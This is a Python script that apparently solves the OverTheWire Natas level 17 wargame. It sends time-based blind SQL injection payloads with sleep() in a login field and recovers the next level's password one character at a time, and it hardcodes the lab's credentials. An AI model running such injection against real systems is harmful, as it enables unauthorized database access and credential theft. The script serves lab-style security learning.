from base64 import b64encode
from itertools import chain
from time import time

import requests

idx = 0
pw = ''
url = 'http://natas17.natas.labs.overthewire.org/index.php?debug'
userAndPass = b64encode(b"natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw").decode("ascii")
headers = {'Authorization': 'Basic %s' % userAndPass}


def measure(username):
    start = time()
    requests.post(url, headers=headers, data={'username': username})
    return time() - start


while idx < 32:
    idx += 1
    print("looking for %i" % idx)

    asciis = chain(range(48, 58), range(65, 91), range(97, 123))
    for a in asciis:
        sleep = 2
        elapsed = measure(f'natas18" AND (ASCII(SUBSTRING(password,{idx},1))={a} AND sleep({sleep})) OR 1="')
        if elapsed >= sleep:
            pw += chr(a)
            print(pw)
            break
